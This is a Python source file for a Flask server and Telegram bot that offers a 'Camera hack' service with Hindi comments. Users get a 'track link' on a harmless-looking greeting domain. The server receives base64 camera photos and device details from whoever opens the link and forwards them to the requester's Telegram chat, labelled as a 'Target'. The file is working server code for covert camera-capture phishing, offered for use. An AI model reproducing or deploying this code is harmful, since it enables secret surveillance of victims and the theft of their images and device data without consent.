import os, base64, threading, sqlite3, time
from flask import Flask, render_template, request, jsonify
import telebot
from telebot import types

app = Flask(__name__)

# सेटिंग्स
BOT_TOKEN = os.getenv('BOT_TOKEN')
MY_CHAT_ID = "7162565886"
ADMIN_ID = 7162565886
bot = telebot.TeleBot(BOT_TOKEN)

# Conflict 409 को जड़ से खत्म करने के लिए
try:
    bot.remove_webhook()
    time.sleep(2)
except:
    pass

def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
    conn.commit()
    conn.close()

@bot.message_handler(commands=['start'])
def start(message):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (message.chat.id,))
    conn.commit()
    conn.close()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Camera hack 📸", callback_data="cam_menu"))
    bot.send_message(message.chat.id, "Select service ✅\nClick on 'camera hack'...", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    base_url = "https://happy-wishing-you.onrender.com" 
    if call.data == "cam_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("📸 Front Camera", callback_data="mode_front"))
        markup.add(types.InlineKeyboardButton("📸 Back Camera", callback_data="mode_back"))
        bot.edit_message_text("😃 Select any service ✅", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data.startswith("mode_"):
        mode = call.data.split("_")[1]
        track_link = f"{base_url}?m={mode}&uid={call.message.chat.id}"
        bot.send_message(call.message.chat.id, f"😃 it's your track link 🔗\n\nUrl= {track_link}")

# --- FLASK ROUTES (यहाँ गलती ठीक की गई है) ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    target_id = data.get('uid', MY_CHAT_ID)
    branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
    report = (f"🛡️ <b>SYSTEM AUDIT</b>\n👤 <b>Target:</b> {data.get('name')}\n"
              f"🔋 <b>Battery:</b> {data.get('info').get('battery')}\n\n{branding}")
    
    if data.get('image'):
        try:
            img_bytes = base64.b64decode(data.get('image').split(',')[1])
            bot.send_photo(target_id, img_bytes, caption=report, parse_mode='HTML')
        except: pass
    return jsonify({"status": "success"})

def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, timeout=90)
        except:
            time.sleep(5)

if __name__ == "__main__":
    init_db()
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
    
